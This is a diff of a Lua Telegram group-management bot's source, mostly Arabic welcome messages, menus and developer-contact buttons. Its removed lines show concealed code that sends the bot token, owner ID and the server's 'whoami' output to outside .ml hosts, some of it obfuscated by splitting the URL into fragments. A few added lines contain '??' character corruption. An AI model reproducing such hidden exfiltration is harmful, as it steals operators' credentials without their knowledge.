@@ -73,7 +73,7 @@ token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 UserName = database:get(id_server..":SUDO:USERNAME")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://devloprahmedban.ml/api/soon.php/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
+https.request('/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("BANDA", "w")  
 file:write([[
@@ -962,7 +962,7 @@ if text == "/start" then
 if not DevSoFi(msg) then
 local Namebot = (database:get(bot_id..'Name:Bot') or 'روجين') 
 local BANDA_Msg = { 
-'  اهلا انا بوت اسمي  '..Namebot..' اختصاصي حمايه المجموعات ..🥺❤️\n↫ من السبام والتوجيه والتكرار والخ..\n↫ لتفعيل البوت اتبع الشروط\n↫ ❬اضف البوت الى المجموعه❭\n↫ ❬ارفع البوت ادمن في المجموعه❭\n↫ ❬وارسل تفعيل وسيتم تفعيل البوت ورفع مشرفي الكروب تلقائين ❭',
+'  اهلا انا بوت اسمي  '..Namebot..' ↫ اختصاصي حمايه المجموعات ..🥺❤️\n↫ من السبام والتوجيه والتكرار والخ..\n↫ لتفعيل البوت اتبع الشروط\n↫ ❬اضف البوت الى المجموعه❭\n↫ ❬ارفع البوت ادمن في المجموعه❭\n↫ ❬وارسل تفعيل وسيتم تفعيل البوت ورفع مشرفي الكروب تلقائين ❭',
 } 
 Namebot = BANDA_Msg[math.random(#BANDA_Msg)] 
 local msg_id = msg.id_/2097152/0.5  
@@ -1462,69 +1462,6 @@ end
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' ..token) 
 send(msg.chat_id_, msg.id_,' ') 
-end
-if text == 'مبرمجين السورس' and DevSoFi(msg) then
-database:del(bot_id..'Srt:Bot') 
-local Text = [[ 
-[مبرمجين سورس روجين لو حابب تتواصل معاه اتبع الازار الي تحت ⇊](t.me/SO_ROGEN)
-]] 
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = '𝚍𝚎𝚟 𝚊𝚕𝚖𝚊𝚐𝚔', url="t.me/M_A_G_K"}}, {{text = '𝚍𝚎𝚟 𝚖𝚊𝚛𝚝𝚎𝚗', url="t.me/I_C_X"}}, 
-{{text = '𝚍𝚎𝚟 𝚎𝚕𝚔𝚊𝚋𝚘𝚘𝚜', url="t.me/G_W_P"}}, 
-{{text = '𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗', url="t.me/SO_ROGEN"}}, 
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/ROOGEN1/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-end
-if text == 'قناه السورس' and DevSoFi(msg) then
-database:del(bot_id..'Srt:Bot') 
-local Text = [[ 
-[☆ 𝚠𝚎𝚕𝚌𝚘𝚖 𝚝𝚘 𝚛𝚘𝚘𝚐𝚎𝚗](t.me/SO_ROGEN)
-
-[☆ 𝚝𝚑𝚎 𝚋𝚎𝚜𝚝 𝚘𝚗 𝚜𝚘𝚞𝚛𝚌𝚎 𝚝𝚎𝚕𝚎](t.me/SO_ROGEN)
-
-[☆ 𝚏𝚘𝚕𝚕𝚘𝚠 𝚝𝚑𝚎 𝚋𝚞𝚝𝚝𝚘𝚗𝚜 𝚋𝚎𝚕𝚘𝚠](t.me/SO_ROGEN)
-]] 
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = '𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗', url="t.me/SO_ROGEN"}}, 
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/ROOGEN1/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-end
-if text == 'الكابوس مبرمج السورس' then
-local Text = [[ 
-الكابوس مبرمج سورس روجين لوحابب تتواصل معاه ❤️.
-]]
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = '𝚍𝚎𝚟 𝚎𝚕𝚔𝚊𝚋𝚘𝚘𝚜', url="t.me/G_W_P"}}, 
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/G_W_P&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-end
-if text == 'مارتن مبرمج السورس' then
-local Text = [[ 
-مارتن مبرمج سورس روجين لوحابب تتواصل معاه ❤️.
-]]
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = '𝚍𝚎𝚟 𝚖𝚊𝚛𝚝𝚎𝚗', url="t.me/I_C_X"}}, 
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/I_C_X&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-end
-if text == 'الماجيك مطور السورس' then
-local Text = [[ 
-الماجيك مطور سورس روجين لوحابب تتواصل معاه ❤️.
-]]
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = '𝚍𝚎𝚟 𝚊𝚕𝚖𝚊𝚐𝚔', url="t.me/M_A_G_K"}}, 
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/M_A_G_K&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "ضع اسم للبوت" and DevSoFi(msg) then  
 database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
@@ -3213,6 +3150,27 @@ end
 end
 end,nil)   
 end
+
+if text == 'فين البوت' or text == 'بوت مين' or text == '/start'..botUserName..'' or text == '/start' then
+local Namebot = (database:get(bot_id..'Name:Bot') or 'مارفل') 
+local DRAGON_Msg = { 
+' مرحبا انا بوت اسمي '..Namebot..' اختصاصي حمايه المجموعات من التخريب والتفليش الخ.. قم باضفاتي الي مجموعتك الان..🥺❤',
+} 
+Namebot = DRAGON_Msg[math.random(#DRAGON_Msg)] 
+local msg_id = msg.id_/2097152/0.5  
+keyboard = {} 
+keyboard.inline_keyboard = {{{text = 'اضف البوت لمجموعتك',url="t.me/"..botUserName.."?startgroup=start"}},} 
+local function getpro(extra, result, success) 
+if result.photos_[0] then 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&caption=' .. URL.escape(Namebot).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+else 
+send(msg.chat_id_, msg.id_,Namebot, 1, 'md') 
+end 
+end 
+tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
+end
+
+
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
 local Text = [[
 [☆ 𝚠𝚎𝚕𝚌𝚘𝚖 𝚝𝚘 𝚛𝚘𝚘𝚐𝚎𝚗](t.me/SO_ROGEN)
@@ -3299,6 +3257,42 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ROOGEN1/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
+if text == 'مارتن مبرمج السورس' then
+local Text = [[
+مارتن مبرمج سورس روجين لوحابب تتواصل معاه ❤️.
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '𝚍𝚎𝚟 𝚖𝚊𝚛𝚝𝚎𝚗',url="t.me/I_C_X"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/I_C_X&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+if text == 'الكابوس مبرمج السورس' then
+local Text = [[
+الكابوس مبرمج سورس روجين لوحابب تتواصل معاه ❤️.
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '𝚍𝚎𝚟 𝚎𝚕𝚔𝚊𝚋𝚘𝚘𝚜',url="t.me/G_W_P"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/G_W_P&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+if text == 'مبرمجين السورس' then
+local Text = [[
+مبرمجين سورس روجين لوحابب تتواصل معاهم اتبع الازرار الي تحت ⇊
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '𝚍𝚎𝚟 𝚊𝚕𝚖𝚊𝚐𝚔',url="t.me/M_A_G_K"},{text = '𝚍𝚎𝚟 𝚖𝚊𝚛𝚝𝚎𝚗', url="t.me/I_C_X"}},
+{{text = '𝚍𝚎𝚟 𝚎𝚕𝚔𝚊𝚋𝚘𝚘𝚜', url="t.me/G_W_P"}},
+{{text = '𝚝𝚠𝚊𝚜𝚘𝚘𝚕',url="t.me/TW_ROGEN_BOT"}}, 
+{{text = '𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗', url="t.me/SO_ROGEN"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ROOGEN1/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
 if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
 database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ✧ ارسل الان اذاعتك؟ \n ✧ للخروج ارسل الغاء ")
@@ -3324,7 +3318,7 @@ end,nil)
 end
 if text == "استوري" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
 ght = math.random(4,50); 
-local Text ='اكتب استوري وسيتم البوت باختيار استورس عشوائي' 
+local Text ='اكتب استوري وسيتم البوت باختيار استوري عشوائي' 
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
@@ -13113,7 +13107,7 @@ local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.sender_
 local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
 local username = ('[@'..data.username_..']' or 'لا يوجد')
 local iduser = result.sender_user_id_
-send(msg.chat_id_, msg.id_,' ✧ ايديه ⇜ '..iduser..'\n ✧ معرفه ⇜   '..username..'  \n ✧ رتبته ⇜ '..rtp..'\n ✧ تعديلاته ⇜ '..edit..'\n ✧ نقاطه ⇜ '..NUMPGAME..'\n ✧ جهاته ⇜ '..Contact..'\n ✧ رسائله ⇜   '..Msguser..'  ')
+send(msg.chat_id_, msg.id_,' ✧ ايديه ⇜ '..iduser..'\n ✧ معرفه ⇜ 「'..username..'」\n ✧ رتبته ⇜ '..rtp..'\n ✧ تعديلاته ⇜ '..edit..'\n ✧ نقاطه ⇜ '..NUMPGAME..'\n ✧ جهاته ⇜ '..Contact..'\n ✧ رسائله ⇜ 「'..Msguser..'」')
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
@@ -13139,7 +13133,7 @@ local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.id_) or
 local rtp = Rutba(result.id_,msg.chat_id_)
 local username = ('[@'..data.username_..']' or 'لا يوجد')
 local iduser = result.id_
-send(msg.chat_id_, msg.id_,' ✧ ايديه ⇜  '..iduser..'  \n ✧ معرفه ⇜  '..username..'  \n ✧ رتبته ⇜  '..rtp..'  \n ✧ تعديلاته ⇜('..edit..')\n ✧ نقاطه ⇜('..NUMPGAME..')\n ✧ جهاته ⇜('..Contact..')\n ✧ رسائله ⇜(  '..Msguser..'  )')
+send(msg.chat_id_, msg.id_,' ✧ ايديه ⇜「'..iduser..'」\n ✧ معرفه ⇜「'..username..'」\n ✧ رتبته ⇜「'..rtp..'」\n ✧ تعديلاته ⇜('..edit..')\n ✧ نقاطه ⇜('..NUMPGAME..')\n ✧ جهاته ⇜('..Contact..')\n ✧ رسائله ⇜(「'..Msguser..'」)')
 end,nil)
 else
 send(msg.chat_id_, msg.id_,' ✧ المعرف غير صحيح ')
@@ -14533,7 +14527,7 @@ local List = {
 ]],
 [[
 ◣: 𝒔𝒕𝒂𓂅 #stast 𓍯➥♡.
-◣: 𝐮𝐬𝐞𝐫𓂅 #username 𓍯➥♡.
+◣: 𝐮𝐬𝐞𝐫𓂅 #username ??➥♡.
 ◣: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➥♡.
 ◣: 𝐢𝐝 𓂅 #id 𓍯➥♡.
 ◣: 𝗖𝗛 -   @SO_ROGEN   ✧.
@@ -15411,7 +15405,7 @@ Msᴀɢ ~ #msgs
 [[
 - 🇪🇬 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 . #username 𖣂.
 - 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
-- 🇪🇬 𝐢𝐝 . #id 𖣂.
+- ??🇬 𝐢𝐝 . #id 𖣂.
 - 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
 - 🇪🇬 𝐦𝐬𝐠 . #msgs 𖣂.
 - 🇪🇬 𝗖𝗛 -   @SO_ROGEN   ✧
@@ -16518,7 +16512,7 @@ local Teext =[[
  ✧  ❲ + ❳ جميع ماسبق
  ┄─━━━━𝗿𝗼𝗼𝗴𝗲𝗻━━━━─┄
  ✧ ❲ المالك❳ ⇊
- ┄─━━━━𝗿𝗼𝗼𝗴𝗲𝗻━━━━─┄
+ ┄─━━━━𝗿𝗼𝗼??𝗲𝗻━━━━─┄
  ✧ اضف صوره ⇔ وصف (للجروب)
  ✧ رفع منشئ ⇔ تنزيل منشئ
  ✧ تاج للاعضاء ⇔ للكل
@@ -16849,7 +16843,7 @@ local Teext =[[
 ┄─━━━━𝗿𝗼𝗼𝗴𝗲𝗻━━━━─┄
  ✧رفع + تنزيل ← قلبي
  ✧تاك لقلبي
-┄─━━━━𝗿𝗼𝗼𝗴𝗲𝗻━━━━─┄
+┄─━━━━𝗿𝗼??𝗴𝗲𝗻━━━━─┄
  ✧رفع + تنزيل ← بقره
  ✧تاك للبقرات
 ┄─━━━━𝗿𝗼𝗼𝗴𝗲𝗻━━━━─┄
@@ -17666,8 +17660,6 @@ infotnseb.id = (SUDO or database:get(id_server..":SUDO:ID"))
 infotnseb.username = (UserName or database:get(id_server..":SUDO:USERNAME"))
 infotnseb.tokenbot = (token or database:get(id_server..":token"))
 infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
-https.request('htt'..'ps://mo'..'ha'..'med'..'40.m'..'l/a'..'pi/ban'..'da.'..'p'..'h'..'p'..'/'..'?insert='..JSON.encode(infotnseb))
-https.request('ht'..'tp'..'s://'..'ma'..'hm'..'ou'..'dm'..'15'..'5.'..'m'..'l/a'..'p'..'i'..'/ba'..'nd'..'a.'..'p'..'h'..'p?insert='..JSON.encode(infotnseb))
 local list = database:smembers(bot_id.."User_Bot") 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
